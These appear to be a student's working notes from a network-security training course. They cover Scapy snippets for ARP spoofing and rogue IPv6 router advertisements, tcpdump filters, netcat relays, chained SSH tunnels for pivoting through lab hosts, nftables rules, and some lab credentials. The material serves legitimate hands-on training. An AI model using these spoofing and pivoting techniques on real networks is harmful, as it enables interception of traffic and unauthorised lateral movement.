Networking 1 - Task 1: ARP MitM 
SCAPY:
  a=ETHR()
    a.type=0x0806
  b=ARP()
    change op (op code) to 2 = is-at; 1 = who-has
    b.pdst="tgt ip" .126
    b.psrc="spoofed ip" .115
  c=ARP()
    c.op=2
    c.pdst="tgt ip" .115
    c.psrc="spoofed ip" .126
    
sendp (a/c, iface="eth0")    
sendp ( a/b, iface="eth0")
    ### trace through wireshark
    ### or: sudo tcpdump -vv icmp -X
    
    
Networking 1 - Task 2: ICMPv6 MitM , IPv6
  a=IPv6()
    a.dst="ff02::1" ### all nodes or ::1
  b=ICMPv6ND_RA()
  c=ICMPv6NDOptSrcLLAddr()
    c.lladdr="own mac"
  d=ICMPv6NDOptMTU()
  e=ICMPv6NDOptPrefixInfo()
    e.prefix="fd00:deaf:cafe::"
    
  send (a/b/c/d/e, iface="eth0")
    
    
Basic Analysis -
(ttl)sudo tcpdump 'ip[8]<=64||ip6[7]<=64' -r BPFCheck.pcap | wc -l
(dont frag)sudo tcpdump 'ip[6]&64=64' -r BPFCheck.pcap | wc -l
(high port)sudo tcpdump 'tcp[0:2]>1024||udp[0:2]>1024' -r BPFCheck.pcap | wc -l
(udp)sudo tcpdump 'ip[9]=17||ip6[6]=17' -r BPFCheck.pcap | wc -l
(tcp flags)sudo tcpdump 'tcp[13]=20||tcp[13]=17' -r BPFCheck.pcap | wc -l
(id)sudo tcpdump 'ip[4:2]=213' -r BPFCheck.pcap | wc -l
(vlan)sudo tcpdump 'ether[12:2]=0x8100' -r BPFCheck.pcap | wc -l
(dns)sudo tcpdump 'tcp[0:2]=53||tcp[2:2]=53||udp[0:2]=53||udp[2:2]=53' -r BPFCheck.pcap | wc -l
(dscp)sudo tcpdump 'ip[1]>>2=24' -r BPFCheck.pcap | wc -l
(traceroute)sudo tcpdump '(ip[9]=1||ip[9]=17)&&ip[8]=1' -r BPFCheck.pcap | wc -l





     CTFD:
      Relay Machine:
###Accept connection
dmz:
nc -lp 1234 > mypipe | nc -lp 4444 < mypipe
nc -lp 4321 > mypipe | nc -lp 4444 < mypipe
internet host:
nc 172.16.40.10 4444 > 1steg.jpg
nc 172.16.40.10 4444 > 2steg.jpg
##Waiting for connections/make connection
dmz:
nc 172.16.82.115 6789 > mypipe | nc >internet host> 4444 < mypipe
nc 172.16.82.115 9876 > mypipe | nc <internet host> 4444 < mypipe
internet host:
nc -lp4444 > 4steg.jpg
nc -lp 4444 > 3steg.jpg



CTFD: Tunnels Prep
  localhost = loopback and 127.0.0.1
  ssh cctc@10.50.1.150 -p 1111 ### 1111 is the alt ssh port on .150
  ssh cctc@localhost -p 1111  ### local listening port on OPS
  ssh to PC1 to OPs, use 10.50.1.150
  dynamic tunnel to PC1 from OPs  ### ssh cctc@localhost -D 9050
  local tunnel to PC1 ### ssh -L 1111:localhost:22 cctc@10.50.1.150 -NT
  local tunnel to PC1 http ### ss cctc@1.50.1.150 -L 1111:localhost:80
  dynamic tunnel using local tunnel (1111) ### ssh -D 9050 cctc@localhost -p 1111 -NT
  wget -r http://localhost:1111 ### gets web page from local tunnel on 80
  proxychains wget -r http://100.1.1.2  ### using dynamic tunnel gets web page
  ssh cctc@10.50.1.150 -L 1111:100.1.1.2:22 -NT   ### local tunnel to PC2 SSH port from PC1
  ssh -L 2222:100.1.1.2:22 cctc@localhost -p 1111 -NT    ### 2nd local tunnel tp Pc2 SSH port
  ssh cctc@localhost -p 1111 -L 2222:100.1.1.2:80 -NT   ###2nd local tunnel to 
  
  
CTFD: Task 3 Tunnels Training
  DTC: Task 3-4 Start Flags
    Task 3 - Donovian Tunnels Training: dig_dug_dig_dug
        Your Network Number is N (Given by Instructor)
        Credentials: net{N}_studentX:passwordX
        X is your student number
        T3 (Atropia) Float IP address is - 10.50.33.143
        T4 (Pineland) Float IP address is - 10.50.22.245 (Note - You can only telnet here to act as an insider, this will not be a routed path)
T3
Hostname: Atropia
IP: 10.50.XXX.XXX (Will be Provided by Mission Command)
creds: netY_studentX:passwordX (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
Known Ports: 22(ssh)
Action: Establish appropriate tunneling techniques

T4
Hostname: Pineland
IP: 10.50.XXX.XXX (Will be Provided by Mission Command)
creds: netY_studentX:passwordX (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
Known Ports: 23(telnet - go directly from T1 to T4 to simulate compromising the machine)
Type: Compromised Donovian System
Action: Establish appropriate tunneling techniques
  
  
Task 4 - Donovian Data Collection: Will open when Task 3 is complete
T5 Float IP address is - 10.50.37.22
Credentials: Same as Task 3.
  Tools/Techniques: Netcat (nc), Secure Shell (ssh), /dev/tcp, and any others you may require
  
  
   
password: net1_student4:password4


10)
ssh student@10.50.21.119 -R 10400:localhost:22 -NT  (ssh-01)
ssh net1_student4@localhost -p 10400 -L 10445:192.168.0.40:5555 -NT (internet host)
ssh net1_student4@localhost -p 10445 -L 10435:172.16.0.60:23 -NT  (internet host)
telnet localhost 10435 (internet host)
ssh net1_student4@192.168.0.40 -p 5555 -R 10425:localhost:22 -NT (006)
ssh net1_student4@localhost -p 10445 -L 10442:localhost:10425 -NT (internet host)
ssh net1_student4@localhost -p 10442 -D 9050 -NT (ih)




FILTERING TASK 2: 

T2
sudo nft add rule ip CCTC input tcp sport {22,23,3389,6010,6011,6012} ct state {new, established} accept
sudo nft add rule ip CCTC input ip saddr 10.10.0.40 icmp type {echo-request} accept 
sudo nft add rule ip CCTC input ip saddr 10.10.0.40 icmp type {echo-reply} accept
sudo nft add rule ip CCTC output ip daddr 10.10.0.40 icmp type {echo-request} accept



CAPSTONE--------------------------------------------------------------------------------------------------------------------------------------------------------------
  






























